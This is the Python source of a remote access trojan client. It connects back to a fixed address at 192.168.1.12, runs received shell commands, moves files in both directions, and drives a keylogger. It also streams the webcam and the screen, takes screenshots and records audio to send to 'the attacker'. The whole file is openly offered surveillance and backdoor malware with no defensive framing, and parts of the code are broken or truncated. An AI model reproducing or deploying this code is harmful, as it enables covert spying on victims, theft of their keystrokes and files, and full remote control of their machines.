import socket
import subprocess
from subprocess import PIPE
import json
import os
from klog import KL
import threading
import cv2
import pickle
import struct
import pyautogui
import pygame
from PIL import ImageGrab
import numpy as np
import pyaudio
import wave

sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sc.connect(('192.168.1.12', 5555))

def accepted():
    data = ''
    while True:
        try:
            data = data + sc.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def ulf(fname):
    file = open(fname, 'rb')
    sc.send(file.read())
    file.close()

def dlf(fname):
    file = open(fname, 'wb')
    sc.settimeout(1)
    _file = sc.recv(1024)
    while _file:
        file.write(_file)
        try:
            _file = sc.recv(1024)
        except socket.timeout as e:
            break
    sc.settimeout(None)
    file.close()

def open_log():
    sc.send(KL().r_log().encode())

def log_thread():
    t = threading.Thread(target=open_log)
    t.start()

def byte_stream():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('192.168.1.12', 9999))
    vid = cv2.VideoCapture(0)
    while (vid.isOpened()):
        img, frame = vid.read()
        b = pickle.dumps(frame)
        message = struct.pack("Q", len(b)) + b
        sock.sendall(message)

def send_byte_stream():
    t = threading.Thread(target=byte_stream)
    t.start()

def bstream_recorder():  # screen recording function
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('192.168.1.12', 9995))

    screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
    screen = screen.get_size()
    WIDTH = screen[0] / 2
    HEIGHT = screen[1]

    while True:
        img = ImageGrab.grab(bbox=(0, 0, WIDTH, HEIGHT))
        capt = np.array(img)
        capt = cv

def sbyte_recorder():
	t = threading.Thread(target=bstream_recorder)
	t.start()

def record_audio():
    chunk = 1024
    format = pyaudio.paInt16
    channels = 1
    rate = 44100
    frames = []

    p = pyaudio.PyAudio()

    stream = p.open(
        format=format,
        channels=channels,
        rate=rate,
        input=True,
        frames_per_buffer=chunk
    )

    print("Recording... (Press Enter to stop)")
    input()

    while True:
        data = stream.read(chunk)
        frames.append(data)

    stream.stop_stream()
    stream.close()
    p.terminate()

    # Save the recorded data as a WAV file
    wf = wave.open("audio.wav", 'wb')
    wf.setnchannels(channels)
    wf.setsampwidth(p.get_sample_size(format))
    wf.setframerate(rate)
    wf.writeframes(b''.join(frames))
    wf.close()

    # Send the audio file to the attacker
    ulf("audio.wav")

def do_command():
    while True:
        command = accepted()
        if command in ('exit', 'out'):
            break
        elif command == 'wipe':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:2] == 'dl':
            ulf(command[3:])
        elif command[:2] == 'ul':
            dlf(command[3:])
        elif command == 'sl':
            KL().s_logger()
        elif command == 'rl':
            log_thread()
        elif command == 'stl':
            KL().st_listen()
        elif command == 'wcam':
            send_byte_stream()
        elif command == 'sh':
            ss = pyautogui.screenshot()
            ss.save('ss.png')
            ulf('ss.png')
        elif command == 'sr':
            sbyte_recorder()
        elif command == 'a':
            record_audio()
        elif command == 'as':
            print("Audio recording stopped.")
        else:
            execute = subprocess.Popen(
                command,
                shell=True,
                stdout=PIPE,
                stderr=PIPE,
                stdin=PIPE
            )
            data = execute.stdout.read() + execute.stderr.read()
            data = data.decode()
            output = json.dumps(data)
            sc.send(output.encode())

do_command()
